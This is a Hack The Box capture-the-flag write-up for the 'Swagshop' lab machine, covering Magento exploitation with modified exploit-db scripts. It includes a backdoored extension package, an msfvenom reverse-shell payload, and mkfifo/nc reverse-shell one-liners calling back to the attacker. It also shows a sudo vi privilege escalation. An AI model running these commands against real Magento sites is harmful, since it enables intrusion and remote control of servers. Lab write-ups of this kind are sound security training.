---
layout: post
title: Swagshop Writeup
date: '2019-11-19 16:14:11'
tags:
- hack-the-box
---

## Enumeration

As usual I started [Autorecon](https://github.com/Tib3rius/AutoRecon) running did some other stuff before coming back to it.

### NMAP Results

Nmap showed that ports 22 and 80 were open. A quick look at port 22 didn't show any interesting with regard to ssh, so I had a look at port 80.

### Nikto Results

These showed that Magento, an e-commerce solution was running. There were also a number of directories exposed that could be looked at.

The file `/RELEASE_NOTES.txt` had the version that was currently installed, and you could also find this out by going to `/downloader`.

Searching for "_magento vulnerability_" leads us to &nbsp;[https://www.cvedetails.com/vulnerability-list/vendor\_id-15393/product\_id-31613/Magento-Magento.html](https://www.cvedetails.com/vulnerability-list/vendor_id-15393/product_id-31613/Magento-Magento.html) and 9,10 and 11 in that list look like they might be interesting as they allow remote exec.  
Looking at &nbsp;[https://www.cvedetails.com/cve/CVE-2015-1399/](https://www.cvedetails.com/cve/CVE-2015-1399/) &nbsp;leads us to &nbsp;http://blog.checkpoint.com/2015/04/20/analyzing-magento-vulnerability/ &nbsp;which is great post on a chain of vulnerabilities. Running `searchsploit` returns a number of exploits, a couple of which are remote execution and sound like they could be chained.

## Exploitation

### Initial Compromise

From the searchsploit results The _Magento eCommerce - Remote Code Execution_ exploit looks like a good &nbsp;one to start with as it doesn't require authentication unlike the last &nbsp;one. Firstly we copy it to a working area so we can tinker with it:

`cp /usr/share/exploitdb/exploits/xml/webapps/37977.py .`

Looking at the code we can see it looks like it's leveraging one of the &nbsp;vulnerabilities listed in the Checkpoint article, so we're on the right &nbsp;track.  
The exploit has a bunch of &nbsp;waffle in it, so this needs to be trimmed first. If you do this and run &nbsp;it it will fail. Time to look more closely at the code.

This is because the URL it tries to build is incorrect. It tries It tries to build the URL with `/admin/Cms_Wysiwyg/directive/index/` but according to the article it should be `/index.php/admin/Cms_Wysiwyg/directive/index/`

So the original code looks like:

    target = "http://target.com/"
    
    if not target.startswith("http"):
        target = "http://" + target
    
    if target.endswith("/"):
        target = target[:-1]
    
    target_url = target + "/admin/Cms_Wysiwyg/directive/index/"

and the fixed code (with some extraneous checks removed is):

    target = "http://10.10.10.140/"
    target_url = target + "index.php/admin/Cms_Wysiwyg/directive/index/"

This worked fine and I could login to http://10.10.10.140/index.php/admin/ with the username and password of forme

### Getting a shell

We now need to get a shell on the box. I did have a play with the second exploit, _Magento CE \< 1.9.0.1 - (Authenticated) Remote Code Execution_, but I couldn't get this to work, though I revisited it later after rooting the box and the details are towards the end.

Having used a bunch of admin interfaces before I wondered if there was a &nbsp;way of uploading custom modules. A google suggest the the Connect &nbsp;Manager under /downloader did exactly that. I then had a google for &nbsp;"magento backdoor" and found this great article [https://dustri.org/b/writing-a-simple-extensionbackdoor-for-magento.html](https://dustri.org/b/writing-a-simple-extensionbackdoor-for-magento.html)

The process seemed straightforward, so I first created a suitable payload with msfvenom:

`msfvenom -p php/reverse_php LHOST=10.10.14.10 LPORT=1234 -f raw > backdoor.php`

and started the usual listener with `nc -lvp 1234`

I then created the package.xml file that's required

    <?xml version="1.0"?>
    <package>
    <name>backdoor</name>
    <version>1.3.3.7</version>
    <stability>devel</stability>
    <licence>backdoor</licence>
    <channel>community</channel>
    <extends/>
    <summary>Backdoor for magento</summary>
    <description>Backdoor for magento</description>
    <notes>backdoor</notes>
    <authors>
        <author>
            <name>bob</name>
            <user>bob</user>
            <email>bob@bobhaddock.org</email>
        </author>
    </authors>
    <date>2019-07-17</date>
    <time>13:47:49</time>
    <contents>
        <target name="mage">
            <dir>
                <dir name="errors">
                    <file name="backdoor.php" hash="98edac532f7ee8c838bd99c68e4fff9c"/>
                               </dir>
            </dir>
        </target>
    </contents>
    <compatible/>
    <dependencies>
        <required>
            <php>
                <min>5.2.0</min>
                <max>6.0.0</max>
            </php>
        </required>
    </dependencies>
    </package>

With the hash being calculated by running `md5sum backdoor.php`

I put the `backdoor.php` file in the `errors` directory and created the gzip file required with:

    tar -cvf backdoor.tar errors/ package.xml
    gzip backdoor.tar

I then uploaded this at `http://10.10.10.140/downloader/`

<figure class="kg-card kg-image-card"><img src="/content/images/2019/11/vlcsnap-2019-07-19-07h26m05s925.png" class="kg-image"></figure>

However, on going to http://10.10.10.140/errors/ I found that what &nbsp;should have been a file had somehow become a directory. I ran through &nbsp;the process again and had the smae result, odd! I did some googling and &nbsp;found this was a bug in Magento and a workaround was to have the &nbsp;extension as .tgz file.

In order to make sure I had a clean build I built a new .tgz from scratch using

`tar -xvzf backdoor.tgz errors/ package.xml`

This time the `backdoor.php` file was actually a file and clicking on it connected back to my listener.

At this point running `id` showed I was the www-data user, which wasn't unexpected. I decided to try for the user flag first, which turned out to be easy:

    10.10.10.140: inverse host lookup failed: Unknown host
    connect to [10.10.14.10] from (UNKNOWN) [10.10.10.140] 58342
    cd /home/
    ls
    haris
    cd haris
    ls
    user.txt
    cat user.txt
    a448877277e82f05e5ddf9f90aefbac8

### Getting root

I did an `ls -al` in `/home/haris` out of habit &nbsp;and noticed the SUDO file which got me thinking about elevating &nbsp;privileges. Looking the sudeors file we see the line:

`www-data ALL=NOPASSWD:/usr/bin/vi /var/www/html/*`

This means the `www-data` user can run vi as root on any files in `/var/www/html`  
So, if we try this the shell hangs, I guess sudo doesn't work in such a basic shell.

At this point I tried a bunch of techniques to get a full tty but none &nbsp;of them worked. I then thought about a different technique to get a &nbsp;slightly better shell.  
To do this I started another listener with `nc -lvp 4096` and then in the webshell I ran

`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.10 4096 > /tmp/f`

This allowed me to catch a sh shell in my other listener.. I can now run vi as root with:

`sudo vi /var/www/html/cron.sh`

and once I'm in vi I can spawn a root shell with `:!/bi/sh`

And now we can go after the root flag:

    id
    uid=0(root) gid=0(root) groups=0(root)
    cd /root
    ls
    root.txt
    cat root.txt
    c2b087d66e14a652a3b86a130ac56721
    
       ______
     /| |/|\| |\
    /_| ´ |.` |_\ We are open! (Almost)
      | |. |
      | |. | Join the beta HTB Swag Store!
      | ___|.__ | https://hackthebox.store/password
    
                       PS: Use root flag as password!

## Extra Credit

At this point I decided to revist the other authenticated RCE as I felt I &nbsp;should be able to chain this with the first one to get a shell, as &nbsp;documented in the Checkpoint article.

First we need to grab the exploit so we can play with it

`cp /usr/share/exploitdb/exploits/php/webapps/37811.py .`

This code is pretty much good to go, we just need some config:

    # Config.
    username = ''
    password = ''
    php_function = 'system' # Note: we can only pass 1 argument to the function
    install_date = 'Sat, 15 Nov 2014 20:27:57 +0000' # This needs to be the exact date from /app/etc/local.xml

The username and password are those from the first exploit, so **forme** in my case. The install\_date is needed as this is used as part of the &nbsp;encryption routine we're going to exploit. Luckily Nikto reported that &nbsp;the `/app` directory was indexable. If we browse to `http://10.10.10.140/app/etc/local.xml` we can get this information.

<figure class="kg-card kg-image-card"><img src="/content/images/2019/11/vlcsnap-2019-07-19-07h31m28s270.png" class="kg-image"></figure>

Once completed the config looks like:

    # Config.
    username = 'forme'
    password = 'forme'
    php_function = 'system' # Note: we can only pass 1 argument to the function
    install_date = 'Wed, 08 May 2019 07:23:09 +0000' # This needs to be the exact date from /app/etc/local.xml

We can then try this out:

    python 37811.py http://10.10.10.140/index.php/admin "id"
    Traceback (most recent call last):
    File "post-rce.py", line 68, in <module>
        tunnel = tunnel.group(1)
    AttributeError: 'NoneType' object has no attribute 'group'

Hmm, okay. So after hunting around I came across [https://websec.wordpress.com/2014/12/08/magento-1-9-0-1-poi/](https://websec.wordpress.com/2014/12/08/magento-1-9-0-1-poi/) which had a good explaination of the vulnerability and helped make sense of the exploit.

Looking at the code it was doing a regular expression search and not &nbsp;finding the information required. I added some debug lines and verified &nbsp;the data wasn't being returned by the server. I then fired up the &nbsp;developer console in firefox and navigated around the page that was &nbsp;being accessed and in the network tab found that the information was &nbsp;being returned if the report period was changed to Year to Date. Looking &nbsp;at the developer console this was specified as `1y` in the request. I then edited the script and replaced

    request = br.open(url + 'block/tab_orders/period/7d/?isAjax=true', data='isAjax=false&form_key=' + key)

with

    request = br.open(url + 'block/tab_orders/period/1y/?isAjax=true', data='isAjax=false&form_key=' + key)

I then reran my test which called `id` and it worked. I then set up a listener with `nc -lvp 1234` and ran:

    python post-rce.py http://10.10.10.140/index.php/admin "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.10 1234 >/tmp/f"

Which got me a shell a different way!

